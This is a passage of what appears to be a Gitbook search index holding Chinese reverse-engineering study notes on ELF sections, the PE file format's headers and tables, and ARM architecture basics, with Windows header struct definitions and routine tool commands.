重要的是：同一个进程中会加载多个库，每一个库都有自己的PLT和GOT，动态链接器会寻找puts函数的地址，将函数的地址插入与put@plt相关的got条目中，完成延迟绑定。 GOT存在的意义 对于每个进程来说，相同的库代码也会映射到不同的虚拟地址中，所以不能直接将解析库函数的地址修补到程序中。因为该地址只在该进程的上下文起作用。但是每个进程都有got表的专用副本，这就可以了。 安全问题。 .dynamic节 充当的是操作系统和动态链接器的“路线图”，具体内容我觉的没啥用，不写了。 .init_array 节 包含一个指向构造函数的指针数组，在main函数被调用前会执行的一系列的构造函数。 init节包含可执行代码 init_array节是一个包含了“所需数量的函数指针”的数据节，也包括了指向自定义构造函数的指针， 在GCC中，可以通过 __attribute__((constructor)) 来修饰函数，将其标记为构造函数。 通过命令objdump -M intel --section .init_array -d learnS,看到该程序中的构造函数只有一个 验证得到： ​ 地址正好指向了函数，这是一个默认的初始化函数，在ida中查看该函数 .fini_array 节 作用和上述.init_array节相反，存放的是一些“析构函数”的指针。 这个程序的析构函数是0x4004b0地址处的函数。 另外：这两个节区的指针很容易被修改，所以是一个方便下钩子（hook）的地方。钩子将初始化甚至结束代码添加到二进制程序中并修改他的行为。 .shstrtab和.dynsym还有.dynstr节区 .shstrtab：一个以NULL结尾的字符串数组，包含了二进制文件中所有节的名称，并根据节头进行索引。可以帮助readelf之类的工具找到节的名称。 .dynsym还有.dynstr：包含了动态链接需要的符号和字符串，所以是不能去掉的。 可以用strip filename的形式去除表中的符号。 程序头 从相同的文件中找到关于elf程序头的定义 typedef struct { Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignment */ } Elf32_Phdr; typedef struct { Elf64_Word p_type; /* Segment type */ Elf64_Word p_flags; /* Segment flags */ Elf64_Off p_offset; /* Segment file offset */ Elf64_Addr p_vaddr; /* Segment virtual address */ Elf64_Addr p_paddr; /* Segment physical address */ Elf64_Xword p_filesz; /* Segment size in file */ Elf64_Xword p_memsz; /* Segment size in memory */ Elf64_Xword p_align; /* Segment alignment */ } Elf64_Phdr; 程序头表提供的是段的视图 通过命令readelf --wide --segments learnS可以看到程序中的程序头 通过下的描述可以发现，段是由节简单的捆绑组成的。 对于重要的字段进行说明。 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000040 0x0000000000400040 0x0000000000400040 0x0001f8 0x0001f8 R 0x8 INTERP 0x000238 0x0000000000400238 0x0000000000400238 0x00001c 0x00001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x000000 0x0000000000400000 0x0000000000400000 0x0006e0 0x0006e0 R E 0x200000 LOAD 0x000e10 0x0000000000600e10 0x0000000000600e10 0x000220 0x000228 RW 0x200000 DYNAMIC 0x000e20 0x0000000000600e20 0x0000000000600e20 0x0001d0 0x0001d0 RW 0x8 NOTE 0x000254 0x0000000000400254 0x0000000000400254 0x000044 0x000044 R 0x4 GNU_EH_FRAME 0x0005a0 0x00000000004005a0 0x00000000004005a0 0x00003c 0x00003c R 0x4 GNU_STACK 0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW 0x10 GNU_RELRO 0x000e10 0x0000000000600e10 0x0000000000600e10 0x0001f0 0x0001f0 R 0x1 p_type 标识了段的类型，该字段存在三个重要的类型： PT_LOAD PT_DYNAMIC PT_INTERP PT_LOAD 具有该表示的段在创建进程 时候会加载到内存中去，在上述代码中可以看到有两个具有 LOAD标识的段，一个包含了可写数据节（off:0x000e10），一个包含不可写数据节(off:0x000000)。 PT_INTERP & PT_INTERP 该段包含了.INTERP节，该节提供了加载二进制文件解释器的名称；PT_INTERP段包含了.dynamic节，该节通知解释器如何运行该二进制文件。 其他的就不重要了。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2022-11-19 13:13:18 "},"MyArticles/Basics/Pe File Structer.html":{"url":"MyArticles/Basics/Pe File Structer.html","title":"PE structure","keywords":"","body":"写在前面 微软基于COFF（通用项目文件格式）来设计的可执行文件，本篇学习笔记是基于《黑客免杀攻防》一书来学习记录的，之前有一篇记录是基于《逆向工程核心原理》写的逆向工程学习-PE文件格式 | R-o-o-t-k-i-t (hellorootkit.github.io)这两篇相互独立，只不过是不同的时间再次学习一下罢了。 可以在文件WinNt.h文件中找到。 一些缩写。 RAW：文件偏移 RVA：相对虚拟地址（是指相对与ImageBase的偏移） VA：虚拟地址，也就是程序被加载到内存中的地址 利用010editor 首先下载对应的模板，然后在010里运行模板，然后alt+f4显示模板变量，这样看起来比较方便，效果如下： 这里分析起来结构就如虎添翼了。 MS-DOS头 普遍存在于PE文件中的一个没啥用的节区，当PE文件运行在dos系统（DOS作为微软公司在个人计算机上使用的一个操作系统载体，1981年 - 1995年）时会执行，告诉你这个程序不能在dos系统里执行。在winnt.h文件的14889行可以找到DOS头的信息 // DOS .EXE header typedef struct _IMAGE_DOS_HEADER{ WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; e_magic 就是4D 5A这两个字节，表示这是一个DOS下的可执行文件 e_ss; e_sp…… 这两个值用来在程序开始的时候初始化SS SP的两个寄存器的值，剩下的后面的几个就是初始化各个对应的寄存器的值。 e_lfarlc 这个头指向了程序中重定位表的地址 e_lfanew 这个值指向的是PE文件头（NT头）的偏移，这个数字的偏移是0x3c（从MZ那开始算起） DOS签名 这里就是一串字符串，和一些汇编代码，可以在dos里显示出这个字符串的汇编代码。 PE头（NT头） 在哪个头文件的15186行可以找对对应的描述 typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; typedef struct _IMAGE_NT_HEADERS { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader; } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; 不论是64位的程序还是32位的程序，这个结构体包含的内容基本是一样的。 Signature DWORD Signature; 这个字段由四个字节组成PE\\x00\\x00 IMAGE_FILE_HEADER IMAGE_FILE_HEADER FileHeader; 这个结构中包含了整个PE文件的概览信息，文件的15006行。 typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; Machine 一个两字节的值，表示了该程序运行在何种CPU上。在15034行可以看到宏定义，很重要的值，但是利用起来没啥用。 #define IMAGE_FILE_MACHINE_UNKNOWN 0 #define IMAGE_FILE_MACHINE_I386 0x014c // Intel 386. #define IMAGE_FILE_MACHINE_R3000 0x0162 // MIPS little-endian, 0x160 big-endian #define IMAGE_FILE_MACHINE_R4000 0x0166 // MIPS little-endian #define IMAGE_FILE_MACHINE_R10000 0x0168 // MIPS little-endian #define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 // MIPS little-endian WCE v2 #define IMAGE_FILE_MACHINE_ALPHA 0x0184 // Alpha_AXP #define IMAGE_FILE_MACHINE_SH3 0x01a2 // SH3 little-endian #define IMAGE_FILE_MACHINE_SH3DSP 0x01a3 #define IMAGE_FILE_MACHINE_SH3E 0x01a4 // SH3E little-endian #define IMAGE_FILE_MACHINE_SH4 0x01a6 // SH4 little-endian #define IMAGE_FILE_MACHINE_SH5 0x01a8 // SH5 #define IMAGE_FILE_MACHINE_ARM 0x01c0 // ARM Little-Endian #define IMAGE_FILE_MACHINE_THUMB 0x01c2 // ARM Thumb/Thumb-2 Little-Endian #define IMAGE_FILE_MACHINE_ARMNT 0x01c4 // ARM Thumb-2 Little-Endian #define IMAGE_FILE_MACHINE_AM33 0x01d3 #define IMAGE_FILE_MACHINE_POWERPC 0x01F0 // IBM PowerPC Little-Endian #define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1 #define IMAGE_FILE_MACHINE_IA64 0x0200 // Intel 64 #define IMAGE_FILE_MACHINE_MIPS16 0x0266 // MIPS #define IMAGE_FILE_MACHINE_ALPHA64 0x0284 // ALPHA64 #define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 // MIPS #define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 // MIPS #define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64 #define IMAGE_FILE_MACHINE_TRICORE 0x0520 // Infineon #define IMAGE_FILE_MACHINE_CEF 0x0CEF #define IMAGE_FILE_MACHINE_EBC 0x0EBC // EFI Byte Code #define IMAGE_FILE_MACHINE_AMD64 0x8664 // AMD64 (K8) #define IMAGE_FILE_MACHINE_M32R 0x9041 // M32R little-endian #define IMAGE_FILE_MACHINE_CEE 0xC0EE NumberOfSections 这个文件中节区的数目，如果说要新增一个节区的话，就要更改这里。 TimeDateStamp 文件的时间戳，在样本分析中可以根据时间戳来进行画像和溯源，这是比系统的日期和时间更加精确的时间。 可以看到都精确到秒了。 NumberOfSymbols 符号表中的符号的数量，COFF文件的符号表 长度固定，只有通过这个结构才能算出来符号表的结尾 SizeOfOptionalHeader 可选头（拓展头）的大小，这个头就在该结构体的后面。可以通过这个大小来判断32位（E0 00）和64位（F0 00）。 Characteristics 这个字段阐述了PE文件的属性，这个值是由众多的属性的值组合成的一个数字，看起来只有两个字节，但是包含了很多的二进制文件的属性。 IMAGE_OPTIONAL_HEADER 从这个块开始，就开始复杂了，就真正进入PE文件结构的核心了。 IMAGE_OPTIONAL_HEADER64 OptionalHeader; 为什么叫可选头，虽然他是必须的，没有就寄了。这是因为文件结构的设计是仿照的COFF文件，所以就传下来了这么一个不合理的名称。 这个头在64位和32位的程序中的结构不同（上面说了，大小不同，所以结构肯定不一样啊）。 这两个头合并成为PE文件头 typedef struct _IMAGE_OPTIONAL_HEADER { // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; // 64位的程序的结构 typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; Magic 文件类型标识，这个分开了PE32+文件（0x020b）,ROM文件（0x0170）,普通可执行文件（0x010b）。 MajorLinkerVersion 链接器的主版本号 MinorLinkerVersion 链接器的子版本号 SizeOfCode 所有的IMAGE_SCN_CNT_CODE的属性的代码的总大小，这是磁盘扇区字节数的整倍数计算，15353行 #define IMAGE_SCN_CNT_CODE 0x00000020 // Section contains code. 就是节区中包含可执行的代码的属性，相当于是可执行属性 AddressOfEntryPoint 程序执行入口RVA地址，一般指向运行时库代码，程序的main之类的入口点由这些库函数调用；在DLL文件中，这个值一般设置为0。 BaseOfCode 代码段的RVA地址，下面那个是数据段的代码段DataOfCode ImageBase 文件装入内存的首选地址，加载器会首先尝试在这个地址加载文件，加载成功就跳过装载器的重定位过程，如果这个地址在内存中被占用的话，装载器就会重新找一个合法的地址装载文件。 SizeOfImage 映像装入内存之后的大小，从ImageBase到最后一个区段的总大小 SizeOfHeaders 前面这些个各种头的总大小 CheckSum 映像文件的校验和，这个对于一般的文件没啥要求，一般就是0，但是对于内核模式的驱动和系统dll的这个值必须有这个合适的值 IMAGE_DATA_DIRECTORY #define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16 // 15047行 IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; PE文件中各种数据结构的索引目录，由数个结构相同的IMAGE_DATA_DIRECTORY组成 typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 在文件中是这么描述的 #define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor IMAGE_DIRECTORY_ENTRY_SECURITY 安全目录，一般用来存放数字签名或者证书之类的。 IMAGE_DIRECTORY_ENTRY_BASERELOC 基址重定位表，存放这一个偏移，是需要执行重定位的代码的偏移信息 IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 绑定输入目录，存储的是一些API绑定信息，这些可以加速程序的加载时间。 IMAGE_DIRECTORY_ENTRY_IAT 导入地址表，保存导入函数的真正地址 节表（区块表） 该表用来描述后面的这些个区段的各种属性，一个PE文件起码要一个节区才能跑，哪怕剩一个也得剩下text节区，连代码段都没了，跑尼玛呢。 该表由首位相连的数个结构相同的结构体构成 可以看到这个表的主要构成就是一堆IMAGE_SECTION_HEADER结构体构成，每一个结构体代表了之后的一个节区 IMAGE_SECTION_HEADER typedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Name 这个字段就是阐述的该节的名称，一个8字节的字符串，开头一般都是.，如果用$开头的同名的区段会合并成一个区段。 VirtualSize 这个和PhysicalAddress字段在一个联合体中，在obj文件中他的值是0x00000000; 其他文件表示的是该节区实际被使用的区段大小（没有经过对齐）。 VirtualAddress 文件载入内存中的RVA，这个地址是按照页内存对齐的，永远是可选头中的SectionAlignment的整数倍。 SizeOfRawData 这个区段在文件中的占用磁盘的大小，按照页内存对齐的，永远是可选头中的FileAlignment的整倍数 PointerToRawData 该区段在文件中的偏移 PointerToRelocations 该区段重定位表的偏移，指向了IMAGE_RELOCATION结构数组 IMAGE_RELOCATION typedef struct _IMAGE_RELOCATION { union { DWORD VirtualAddress; DWORD RelocCount; // Set to the real count when IMAGE_SCN_LNK_NRELOC_OVFL is set } DUMMYUNIONNAME; DWORD SymbolTableIndex; WORD Type; } IMAGE_RELOCATION; typedef IMAGE_RELOCATION UNALIGNED *PIMAGE_RELOCATION; Characteristics 阐述了区段的一些属性，比如读写情况和其他状态。这些属性有些事可以合并的，在程序中可以通过|来合并属性 区段的命名 区段名称可以自定义，但是一般是使用默认的区段名称。 可以通过如下形式对程序中的数据段进行改名。 #pragma data_seg(\"任意的名字\"); 区段的对齐 在文件中不论是什么内容，都要遵守一个页对齐的规则。对于PE文件来说，只要是2的倍数就可以 以text区段为例 看到这个段的VirtualSize是0x1d18，然后再看VirtualAddress和SizeOfRawData这两个字段 VirtualAddress：0x1000 所以这个区段在内存中的大小应该是0x2000，缺的字节用0x00补齐。用x64dbg可以证明： SizeOfRawData：0x1E00 根据上述大小，这个区段在硬盘中的大小应该是0x1E00的整倍数，所以理论上应该是0x1E00。 后续： 根据书上介绍，后面的内容都会教你如何定位，但是现在的CFF，PE studio这么方便，没必要再去研究怎么手动定位了。 IMAGE_EXPORT_DIRECTORY（导出表） 在头文件的16148行找到了这个结构体的描述 typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; //默认是0，作为保留值 DWORD TimeDateStamp; //导出表创建时间 WORD MajorVersion; WORD MinorVersion; DWORD Name; //指向模块的名称的RVA地址 DWORD Base; DWORD NumberOfFunctions; //导出地址表（EAT）中成员个数 DWORD NumberOfNames; //导出名称表（ENT）中成员个数 DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 导出表主要是存放的程序的导出函数，exe文件一般没有这个表，普遍存在dll文件中。 不知道为啥，这个资料用了很大的章节来阐述如何定位到导出表……， 导出表在逻辑上分为三部分：名称表；序号表；函数表。 调用者通过前两者进行索引，找到真正的函数表。我们平时调用dll时用到的序号，需要减去DWORD Base;的值才能得到真正的保存的序号。但是不知道这个有什么实际用处 IMAGE_IMPORT_DIRECTORY（导入表） 这个表是重要的一个表。这个表存在的意义是：该程序调用第三方API函数供本地使用的调用机制。这个表普遍存在于PE文件中。 typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // 输入表名称（INT）的RVA } DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; // 指出导入此映像文件的名字 DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses) } IMAGE_IMPORT_DESCRIPTOR; 该结构并不能完成PE文件整个的导入文件，只是帮助装载器找到程序真正的保存有导入信息的结构。真正保存导入函数的是如下两个结构体_IMAGE_IMPORT_BY_NAME和_IMAGE_THUNK_DATA。16166行 typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; typedef struct _IMAGE_THUNK_DATA64 { union { ULONGLONG ForwarderString; // 转发字符串的RVA ULONGLONG Function; // 被导出函数的地址 ULONGLONG Ordinal; ULONGLONG AddressOfData; // PIMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA64; typedef struct _IMAGE_THUNK_DATA32 { union { DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME } u1; } IMAGE_THUNK_DATA32; IMAGE_IMPORT_DIRECTORY结构的个数由导入函数的数量决定，最后以一个空的IMAGE_IMPORT_DIRECTORY结构结尾 这个实例程序中只有两个结构，一个是kernel32的一个是msvcrt的 包含最后一个空结构： OriginalFirstThunk 包含指向INT的RVA，INT就是一个_IMAGE_THUNK_DATA类型的数组，结尾是一个空的_IMAGE_THUNK_DATA结构体；一般情况下，每一个_IMAGE_THUNK_DATA结构会指向_IMAGE_IMPORT_BY_NAME结构。 _IMAGE_IMPORT_BY_NAME结构体 typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; // 导入表需要导入的函数的符号 CHAR Name[1]; // 导入表需要导入的函数的名称 } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; 该结构最后也是一个全空的结构体结尾， FirstThunk 指向导入地址表（IAT）的RVA地址 异常 异常目录常用来存放用于描述异常处理的相关的异常处理函数、SEH相关的地址等信息，这些信息一般位于pdata区段中。 PE文件结构中的异常目录目前只在： X64 ARMv7 ARM MIPS PowerPC 这些平台上才有实际作用。 在16551行可以找到这个结构体的描述 typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY { DWORD BeginAddress; // SEH代码起始地址 DWORD EndAddress; // SEH代码的结束地址 union { DWORD UnwindInfoAddress; DWORD UnwindData; } DUMMYUNIONNAME; } _IMAGE_RUNTIME_FUNCTION_ENTRY, *_PIMAGE_RUNTIME_FUNCTION_ENTRY; 安全 数据目录的IMAGE_DIRECTORY_ENTRY_SECURITY指向这个结构。这个目录也被称为“安全目录”或者“属性证书目录”，一般存放的是文件的数字签名。 安全目录结构 在wintrust.h文件中1398行可以找到描述 typedef struct _WIN_CERTIFICATE { DWORD dwLength; // 当前结构体的长度 WORD wRevision; // 签名的版本号 WORD wCertificateType; // WIN_CERT_TYPE_xxx BYTE bCertificate[ANYSIZE_ARRAY]; // 包含了许多证书 } WIN_CERTIFICATE, *LPWIN_CERTIFICATE; 基质重定向表 在运行的时候，总是exe文件被优先加载，所以这个表普遍存在于dll文件中，当exe文件或者其他文件运行占据了dll的默认地址，就会进行重定向。 一般情况下.reloc的段中存在这个基址重定位表；将PE文件中所有需要重定位的地址放在一个数组里。 IMAGE_BASE_RELOCATION typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; DWORD SizeOfBlock; // WORD TypeOffset[1]; } IMAGE_BASE_RELOCATION; 在一个PE文件中，重定位结构由众多的上述结构组成。根据书上说：每个这个结构管理的只有4kb大小的分页内的重定位信息，PE文件中每隔0x1000字节的大小就需要一个这个结构与其对应，所以这个结构中的VirtualAddress的值永远是0x1000的倍数。 调试 数据结构目录中的IMAGE_DIRECTORY_ENTRY_DEBUG结构指向了这个结构，该结构也被成为是调试目录，一般保存在.debug区段中。 IMAGE_DEBUG_DIRECTORY typedef struct _IMAGE_DEBUG_DIRECTORY { DWORD Characteristics; // 保留字段 DWORD TimeDateStamp; // 调试数据建立的时间和日期 WORD MajorVersion; WORD MinorVersion; DWORD Type; DWORD SizeOfData; DWORD AddressOfRawData; // 加载到内存的调试数据RVA DWORD PointerToRawData; // 调式数据的文件偏移 } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY; 这个结构体不是很严格，在type里可以自定义一些类型，但是我也没有实际操作，所以我不清楚这个节区具体有什么用处 TLS 见另一笔记，本篇只用来记录PE结构的一些内容。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-02-13 15:26:36 "},"MyArticles/Basics/arm学习.html":{"url":"MyArticles/Basics/arm学习.html","title":"ARM 基础学习","keywords":"","body":"精简指令集 RISC ARM属于精简指令集，大约100条左右的指令，先比较于x86汇编，arm不能直接操作内存的加减，只能控制寄存器，所以需要将内存ldr到寄存器中进行操作后返回内存。 比x86（CISC）快 RISC指令集允许通过缩短时钟周期来加速代码执行 端序 arm3之前小端序，之后的架构支持大端序，可以手动设置，而x86和x64仅仅支持小端序。 ARM 基本特性 特权模式 1、不同于x86架构的r0内核模式和r3用户模式，arm提供了更多的特权模式（命名用的是英文的缩写）。 USR：用户模式 ---> R3：用户运行的层级 FIQ：快速中断请求模式 IRQ：中断请求模式 SVC：管理模式（supervisor） ---> R0：一般操作系统内核运行的层级 MON：监视模式 ABT：终止模式 UND：未定义指令模式 SYS：系统模式 thumb 都属于arm架构，只不过是指令的长度不同，一个arm程序中可以混用两种指令长度的模式，只需要在汇编代码后面标注就可以。 ARM指令为32位、Thumb为16或者32位。 执行状态选择 0、默认状态下是ARM模式，直到出现显示或者隐式的转换。 1、利用BX、BXL进行跳转的时候，目标寄存器最低位是1（奇数），会切换到thumb模式。 2、程序状态寄存器（CPSR）的T标志位被置起，则切换到thumb模式。 3、32位的thumb指令后面用.W进行标注。 版本问题 thumb-1 用于ARM v6及之前的体系结构，ARM v7只用thumb-2. 条件执行 arm支持 条件执行 ：在指令中编码了算数条件，满足条件才会执行。 优点： 提高了代码密度 减少执行指令的数目 ARM 的每一个指令都支持 条件执行 ，但是默认都是无条件执行的。 桶式位移器 相当于指令的合并操作，在一个指令中包含多步操作。 MOV R1, R0, LSL #1 ;将r0寄存器左移一位后，传递给r1 运行ARM程序 运行 ubuntu1804环境，成功安装qemu，执行显示缺少ld-linux.so.3文件，通过命令 sudo find / -name \"ld-linux.so.3\" 找到对应的so文件，然后使用命令 qemu-arm -L /usr/arm-linux-gnueabihf/lib/ call_ret 运行arm文件。 或者编译的时候直接使用-static静态编译可以解决问题 避免每次运行的时候使用qemu-***的形式，可以下载 apt install binfmt* 调试 使用gdb远程调试的原理，先本机开一个运行端口，然后gdb远程访问。 数据类型 & 寄存器 ARM 的操作都是基于寄存器的操作，无法像x86那样可以直接操作内存中的内容。 换算 32bit = 4byte = 1word = 1/2dword。 16bit = 半字（half word），不知道为啥会单独出一个半字的数据类型。 16bit：扩展后缀为-h或者-sh对应着， byte：-b或者-sb对应着字节 ldr = 加载字，宽度四字节 ldrh = 加载无符号的半字，宽度两字节 ldrsh = 加载有符号的半字，宽度两字节 ldrb = 加载无符号的字节 ldrsb = 加载有符号的字节 str = 存储字，宽度四字节 strh = 存储无符号的半字，宽度两字节 strsh = 存储有符号的半字，宽度两字节 strb = 存储无符号的字节 strsb = 存储有符号的字节 寄存器 定义了16个32bit通用寄存器（R0-R15）r0一般也用来放返回值，最后三个有特殊用处，0-12是通用的。 r11：栈帧寄存器 栈帧寄存器，相当于是rbp r13：栈寄存器 栈指针寄存器，SP。相当于x86架构中的rsp寄存器，永远指向栈顶端。 r14：连接寄存器 连接寄存器，LR。在函数调用中保存返回地址。在BL的时候会把返回地址保存在这个寄存器中，x86会保存在栈顶。 r15：计数寄存器 程序计数寄存器，每次执行一个+8或者+4，类似于rip指令，但是他是支持arm程序直接读写的，并且会执行并跳转，也就是说他并不会一直指向下一条指令， CPSR：程序状态寄存器 类似于x86里的EFLAG或者RFLAG寄存器，保存程序的一些状态。 E 大小端标志位，0-->小端 T thumb标志位，thumb状态为1 M 模式标志位，确定当前特权模式。 系统级控制设置 arm利用 协处理器 来支持额外的指令和系统级设置。 以 MMU（内存 管理 单元） 为例。如果系统是支持的，那么就要要向内核或者启动代码提供对应的接口，在x86架构中，这些接口会放在CR0-CR4寄存器中。 在ARM中， 有16个协处理器，CP0-CP15（P0-P15），每个协处理器有16个寄存器和对应的8个操作码。 协处理器只能通过MRC读和MCR写这俩指令来访问。这俩指令的参数一般是编号的形式，例如：读出转换基址寄存器并保存到CR0中。读出p15中的c2和c0保存在r0中。 这些东西常用在固件中，或者嵌入式开发之类的。 MRC p15, 0, r0, c2, c0, 0 x86中的控制寄存器 CPU架构中共有CR0、CR1、CR2、CR3、CR4、CR8共6个控制寄存器，如下图。 CR0：包含当前处理器运行的控制标志。 CR1：保留。 CR2：包含发生页面错误时的线性地址。 CR3：页面目录表（Page Directory Table）的物理地址。 CR4：包含处理器扩展功能的标志位。 CR8：提供对任务优先级寄存器（Task Priority Register）的读写（仅在64位模式下存在）。 对控制寄存器的读写是通过MOV CRn指令来实现。 ARM 指令集 1、连续横杠间断逗： PUSH {R11,LR} ;将R11和LR寄存器的值push到栈中。 PUSH {R11,R15} ;将R11 到 R15中的值push到栈中。 2、更新基址用叹号： STM R1, {R3-R10} ; R1 = 数组 STM R1!, {R3-R10} ; R1 = 